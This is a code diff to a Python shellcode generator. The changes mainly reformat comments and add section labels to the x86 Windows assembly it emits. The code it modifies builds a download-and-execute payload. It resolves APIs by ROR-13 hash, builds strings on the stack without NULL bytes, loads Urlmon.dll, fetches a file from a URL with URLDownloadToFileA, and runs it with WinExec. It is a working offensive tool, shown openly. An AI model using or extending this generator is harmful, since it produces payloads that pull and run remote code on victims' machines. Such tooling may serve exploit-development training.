@@ -58,9 +58,44 @@ class ShellcodeGenerator:
         Args:
             comment (str): The comment text to add
         """
+        # Handle newlines - if comment starts with \n, add empty lines first
+        leading_newlines = 0
+        if comment.startswith("\n"):
+            # Count leading newlines
+            for char in comment:
+                if char == "\n":
+                    leading_newlines += 1
+                else:
+                    break
+            
+            # Remove leading newlines from comment text
+            comment = comment.lstrip("\n")
+        
+        # Add empty comment lines for spacing (before the actual comment)
+        for _ in range(leading_newlines):
+            self.code.append("")
+            self.code_with_comments.append(("", ""))
+        
         if comment.strip():
-            self.code.append(f"# {comment}")
-            self.code_with_comments.append((f"# {comment}", ""))
+            # Use # for all comments
+            if comment.startswith("# "):
+                # Already has #, use it as is
+                comment_text = comment
+            elif comment.startswith("#"):
+                # Has # but no space, use as is
+                comment_text = comment
+            elif comment.startswith("##"):
+                # Has ##, convert to single #
+                comment_text = "#" + comment.lstrip("#")
+            else:
+                # No #, add single # 
+                comment_text = f"# {comment}"
+            self.code.append(comment_text)
+            self.code_with_comments.append((comment_text, ""))
+        elif comment == "" and leading_newlines == 0:
+            # Empty comment - add empty line (only if no leading newlines already added)
+            self.code.append("")
+            self.code_with_comments.append(("", ""))
     
     def explain_instruction(self, instruction):
         """
@@ -237,9 +272,30 @@ class ShellcodeGenerator:
                 dword |= (byte_val << (8 * j))
             dwords.append(dword & 0xFFFFFFFF)
         
-        # Push all dwords
-        for dword in reversed(dwords):
-            lines.append((f"push 0x{dword:08x}", ""))
+        # Push all dwords - each push builds part of the string
+        for idx, dword in enumerate(reversed(dwords)):
+            # Extract bytes from dword (little-endian: LSB first)
+            ascii_str = ""
+            for i in range(4):
+                byte_val = (dword >> (i * 8)) & 0xFF
+                # Skip padding (0x41) and NULL placeholder (0x01)
+                if byte_val == 0x41 or byte_val == 0x01:
+                    continue
+                if byte_val == 0x00:
+                    break
+                if 32 <= byte_val <= 126:  # Printable ASCII
+                    ascii_str += chr(byte_val)
+                else:
+                    # Non-printable byte found, stop
+                    break
+            
+            # Format comment: show hex value and ASCII representation
+            if ascii_str:
+                comment = f"0x{dword:08x} = \"{ascii_str}\""
+            else:
+                comment = f"0x{dword:08x}"
+            
+            lines.append((f"push 0x{dword:08x}", comment))
         
         # Set pointer and NULL terminator
         lines.append((f"mov {dest_reg}, esp", f"Store string pointer in {dest_reg.upper()}"))
@@ -345,95 +401,97 @@ class ShellcodeGenerator:
         
         # Add detailed API comment with C function signature
         self.add_comment("")
+        self.add_comment(f"\n===== {api_name} =====")
         if api_name == "SHGetFolderPathA":
-            self.add_comment("# SHFOLDERAPI SHGetFolderPathA(")
-            self.add_comment("#   [in]  HWND   hwnd,")
-            self.add_comment("#   [in]  int    csidl,")
-            self.add_comment("#   [in]  HANDLE hToken,")
-            self.add_comment("#   [in]  DWORD  dwFlags,")
-            self.add_comment("#   [out] LPSTR  pszPath")
-            self.add_comment("# );")
+            self.add_comment("SHFOLDERAPI SHGetFolderPathA(")
+            self.add_comment("  [in]  HWND   hwnd,")
+            self.add_comment("  [in]  int    csidl,")
+            self.add_comment("  [in]  HANDLE hToken,")
+            self.add_comment("  [in]  DWORD  dwFlags,")
+            self.add_comment("  [out] LPSTR  pszPath")
+            self.add_comment(");")
         elif api_name == "URLDownloadToFileA":
-            self.add_comment("# HRESULT URLDownloadToFileA(")
-            self.add_comment("#   [in] LPUNKNOWN            pCaller,")
-            self.add_comment("#   [in] LPCSTR               szURL,")
-            self.add_comment("#   [in] LPCSTR               szFileName,")
-            self.add_comment("#   [in] DWORD                dwReserved,")
-            self.add_comment("#   [in] LPBINDSTATUSCALLBACK lpfnCB")
-            self.add_comment("# );")
+            self.add_comment("HRESULT URLDownloadToFileA(")
+            self.add_comment("  [in] LPUNKNOWN            pCaller,")
+            self.add_comment("  [in] LPCSTR               szURL,")
+            self.add_comment("  [in] LPCSTR               szFileName,")
+            self.add_comment("  [in] DWORD                dwReserved,")
+            self.add_comment("  [in] LPBINDSTATUSCALLBACK lpfnCB")
+            self.add_comment(");")
         elif api_name == "WinExec":
-            self.add_comment("# UINT WinExec(")
-            self.add_comment("#   [in] LPCSTR lpCmdLine,")
-            self.add_comment("#   [in] UINT   uCmdShow")
-            self.add_comment("# );")
+            self.add_comment("UINT WinExec(")
+            self.add_comment("  [in] LPCSTR lpCmdLine,")
+            self.add_comment("  [in] UINT   uCmdShow")
+            self.add_comment(");")
         elif api_name == "TerminateProcess":
-            self.add_comment("# BOOL TerminateProcess(")
-            self.add_comment("#   [in] HANDLE hProcess,")
-            self.add_comment("#   [in] UINT   uExitCode")
-            self.add_comment("# );")
+            self.add_comment("BOOL TerminateProcess(")
+            self.add_comment("  [in] HANDLE hProcess,")
+            self.add_comment("  [in] UINT   uExitCode")
+            self.add_comment(");")
         elif api_name == "LoadLibraryA":
-            self.add_comment("# HMODULE LoadLibraryA(")
-            self.add_comment("#   [in] LPCSTR lpLibFileName")
-            self.add_comment("# );")
+            self.add_comment("HMODULE LoadLibraryA(")
+            self.add_comment("  [in] LPCSTR lpLibFileName")
+            self.add_comment(");")
         elif api_name == "CopyFileA":
-            self.add_comment("# BOOL CopyFileA(")
-            self.add_comment("#   [in] LPCSTR lpExistingFileName,")
-            self.add_comment("#   [in] LPCSTR lpNewFileName,")
-            self.add_comment("#   [in] BOOL   bFailIfExists")
-            self.add_comment("# );")
+            self.add_comment("BOOL CopyFileA(")
+            self.add_comment("  [in] LPCSTR lpExistingFileName,")
+            self.add_comment("  [in] LPCSTR lpNewFileName,")
+            self.add_comment("  [in] BOOL   bFailIfExists")
+            self.add_comment(");")
         elif api_name == "CopyFileExA":
-            self.add_comment("# BOOL CopyFileExA(")
-            self.add_comment("#   [in]           LPCSTR              lpExistingFileName,")
-            self.add_comment("#   [in]           LPCSTR              lpNewFileName,")
-            self.add_comment("#   [in, optional] LPPROGRESS_ROUTINE  lpProgressRoutine,")
-            self.add_comment("#   [in, optional] LPVOID              lpData,")
-            self.add_comment("#   [in, optional] LPBOOL              pbCancel,")
-            self.add_comment("#   [in]           DWORD               dwCopyFlags")
-            self.add_comment("# );")
+            self.add_comment("BOOL CopyFileExA(")
+            self.add_comment("  [in]           LPCSTR              lpExistingFileName,")
+            self.add_comment("  [in]           LPCSTR              lpNewFileName,")
+            self.add_comment("  [in, optional] LPPROGRESS_ROUTINE  lpProgressRoutine,")
+            self.add_comment("  [in, optional] LPVOID              lpData,")
+            self.add_comment("  [in, optional] LPBOOL              pbCancel,")
+            self.add_comment("  [in]           DWORD               dwCopyFlags")
+            self.add_comment(");")
         elif api_name == "MoveFileA":
-            self.add_comment("# BOOL MoveFileA(")
-            self.add_comment("#   [in] LPCSTR lpExistingFileName,")
-            self.add_comment("#   [in] LPCSTR lpNewFileName")
-            self.add_comment("# );")
+            self.add_comment("BOOL MoveFileA(")
+            self.add_comment("  [in] LPCSTR lpExistingFileName,")
+            self.add_comment("  [in] LPCSTR lpNewFileName")
+            self.add_comment(");")
         elif api_name == "CreateProcessA":
-            self.add_comment("# BOOL CreateProcessA(")
-            self.add_comment("#   [in, optional]     LPCSTR               lpApplicationName,")
-            self.add_comment("#   [in, out, optional] LPSTR                lpCommandLine,")
-            self.add_comment("#   [in, optional]     LPSECURITY_ATTRIBUTES lpProcessAttributes,")
-            self.add_comment("#   [in, optional]     LPSECURITY_ATTRIBUTES lpThreadAttributes,")
-            self.add_comment("#   [in]                BOOL                 bInheritHandles,")
-            self.add_comment("#   [in]                DWORD                dwCreationFlags,")
-            self.add_comment("#   [in, optional]     LPVOID               lpEnvironment,")
-            self.add_comment("#   [in, optional]     LPCSTR               lpCurrentDirectory,")
-            self.add_comment("#   [in]                LPSTARTUPINFOA       lpStartupInfo,")
-            self.add_comment("#   [out]               LPPROCESS_INFORMATION lpProcessInformation")
-            self.add_comment("# );")
+            self.add_comment("BOOL CreateProcessA(")
+            self.add_comment("  [in, optional]     LPCSTR               lpApplicationName,")
+            self.add_comment("  [in, out, optional] LPSTR                lpCommandLine,")
+            self.add_comment("  [in, optional]     LPSECURITY_ATTRIBUTES lpProcessAttributes,")
+            self.add_comment("  [in, optional]     LPSECURITY_ATTRIBUTES lpThreadAttributes,")
+            self.add_comment("  [in]                BOOL                 bInheritHandles,")
+            self.add_comment("  [in]                DWORD                dwCreationFlags,")
+            self.add_comment("  [in, optional]     LPVOID               lpEnvironment,")
+            self.add_comment("  [in, optional]     LPCSTR               lpCurrentDirectory,")
+            self.add_comment("  [in]                LPSTARTUPINFOA       lpStartupInfo,")
+            self.add_comment("  [out]               LPPROCESS_INFORMATION lpProcessInformation")
+            self.add_comment(");")
         elif api_name == "GetUserNameA":
-            self.add_comment("# BOOL GetUserNameA(")
-            self.add_comment("#   [out] LPSTR  lpBuffer,")
-            self.add_comment("#   [in, out] LPDWORD lpnSize")
-            self.add_comment("# );")
+            self.add_comment("BOOL GetUserNameA(")
+            self.add_comment("  [out] LPSTR  lpBuffer,")
+            self.add_comment("  [in, out] LPDWORD lpnSize")
+            self.add_comment(");")
         elif api_name == "GetUserProfileDirectoryA":
-            self.add_comment("# BOOL GetUserProfileDirectoryA(")
-            self.add_comment("#   [in]      HANDLE hToken,")
-            self.add_comment("#   [out]     LPSTR  lpProfileDir,")
-            self.add_comment("#   [in, out] LPDWORD lpcchSize")
-            self.add_comment("# );")
+            self.add_comment("BOOL GetUserProfileDirectoryA(")
+            self.add_comment("  [in]      HANDLE hToken,")
+            self.add_comment("  [out]     LPSTR  lpProfileDir,")
+            self.add_comment("  [in, out] LPDWORD lpcchSize")
+            self.add_comment(");")
         elif api_name == "WaitForSingleObject":
-            self.add_comment("# DWORD WaitForSingleObject(")
-            self.add_comment("#   [in] HANDLE hHandle,")
-            self.add_comment("#   [in] DWORD  dwMilliseconds")
-            self.add_comment("# );")
+            self.add_comment("DWORD WaitForSingleObject(")
+            self.add_comment("  [in] HANDLE hHandle,")
+            self.add_comment("  [in] DWORD  dwMilliseconds")
+            self.add_comment(");")
         else:
             # Generic format for other APIs
-            self.add_comment(f"# {api_name}()")
+            self.add_comment(f"{api_name}()")
         
-        self.add_comment(f"# Return: Stored at [EBP + {hex(offset)}]")
+        self.add_comment("")
+        self.add_comment(f"Return: Stored at [EBP + {hex(offset)}]")
         self.add_comment("")
         
         # Resolve hash and API address
-        self.add_comment(f"# Resolving hash for {api_name}: {hex(hash_value)}")
-        self.add_line(hash_str, f"Push ROR-13 hash value {hex(hash_value)} for {api_name} function name")
+        self.add_comment(f"Resolving hash for {api_name}: {hex(hash_value)}")
+        self.add_line(hash_str, f"Resolving hash for {api_name}")
         self.add_line("call dword ptr [ebp+0x4]", f"Call function finder to locate {api_name} address in loaded DLL using hash")
         self.add_line(f"mov [ebp + {hex(offset)}], eax", f"Store resolved {api_name} function pointer at [EBP + {hex(offset)}] for later use")
         
@@ -1361,6 +1419,8 @@ class ShellcodeGenerator:
         )
 
         # Call SHGetFolderPathA
+        self.add_comment("")
+        self.add_comment("===== Call SHGetFolderPathA =====")
         self.add_line("mov eax, 0x41414141", "Load value 0x41414141 into EAX (avoids NULL bytes in immediate)")
         self.add_line("sub eax, 0x4141403d", "Subtract to calculate 0x104 (260 decimal = MAX_PATH buffer size) without NULL bytes")
         self.add_line("sub esp, eax", "Allocate 0x104 (260) bytes on stack for path buffer (stack grows downward)")
@@ -1374,6 +1434,8 @@ class ShellcodeGenerator:
         self.add_line(f"call [ebp + {hex(shget_offset)}]", f"Call SHGetFolderPathA at [EBP+{hex(shget_offset)}] to retrieve special folder path")
 
         # Append filename
+        self.add_comment("")
+        self.add_comment("===== Append Filename to Path =====")
         find_null = f"find_null_{self.label_counter}"
         self.label_counter += 1
         self.add_line("mov esi, edi", "Copy path buffer pointer to ESI to scan for NULL terminator")
@@ -1398,10 +1460,13 @@ class ShellcodeGenerator:
             "LoadLibraryA": 0x14,
             "URLDownloadToFileA": 0x24,
         }
+        self.add_comment("")
+        self.add_comment("===== Load Urlmon.dll =====")
         self.add_line("mov ebx, [ebp+0x8]", "Restore kernel32.dll base address from [EBP+0x8] for LoadLibraryA call")
         loadlibrary_offset = self._ensure_api_available("LoadLibraryA", desired_offset=fixed_offsets["LoadLibraryA"])
 
         # Ensure Urlmon.dll + URLDownloadToFileA
+        self.add_comment("Building 'Urlmon.dll' string on stack")
         for item in self.build_string_no_nulls("Urlmon.dll", dest_reg="esi"):
             self._process_string_item(item)
         self.add_line("push esi", "Push pointer to 'Urlmon.dll' string onto stack as argument for LoadLibraryA")
@@ -1421,13 +1486,18 @@ class ShellcodeGenerator:
         )
 
         # Load stored path
+        self.add_comment("")
+        self.add_comment("===== Build URL String =====")
         self.add_line("mov edx, [ebp-0x30]", "Load full file path pointer from [EBP-0x30] (set earlier by SHGetFolderPathA path builder)")
 
         # Build URL string
+        self.add_comment(f"Building URL string '{url}' on stack")
         for item in self.build_string_no_nulls(url, dest_reg="ecx"):
             self._process_string_item(item)
 
         # Download
+        self.add_comment("")
+        self.add_comment("===== Call URLDownloadToFileA =====")
         self.add_line("xor eax, eax", "Clear EAX to zero for NULL parameters in URLDownloadToFileA call")
         self.add_line("push eax", "Push lpfnCB = NULL (no callback function needed for download progress)")
         self.add_line("push eax", "Push dwReserved = 0 (reserved parameter, must be zero)")
@@ -1443,6 +1513,8 @@ class ShellcodeGenerator:
         fixed_offsets = {
             "WinExec": 0x1c,
         }
+        self.add_comment("")
+        self.add_comment("===== Execute Downloaded File =====")
         self.add_line("mov ebx, [ebp+0x8]", "Restore kernel32.dll base address from [EBP+0x8] for WinExec resolution")
         winexec_offset = self._ensure_api_available(
             "WinExec", 
@@ -1698,12 +1770,16 @@ def main():
                     if i > 0:
                         f.write('\n')
                 elif line_type == 'comment':
-                    # Write comment on separate line with single # tag
+                    # Write comment on separate line with # tag
                     comment_text = content[0]
-                    if comment_text.startswith('#'):
-                        # Remove extra # if present, keep only one
+                    if comment_text.startswith('##'):
+                        # Has ##, convert to single #
                         comment_text = '#' + comment_text.lstrip('#')
+                    elif comment_text.startswith('#'):
+                        # Already has #, use as is
+                        comment_text = comment_text
                     else:
+                        # No #, add single #
                         comment_text = '# ' + comment_text
                     f.write(f'    {comment_text}\n')
                 elif line_type == 'code':
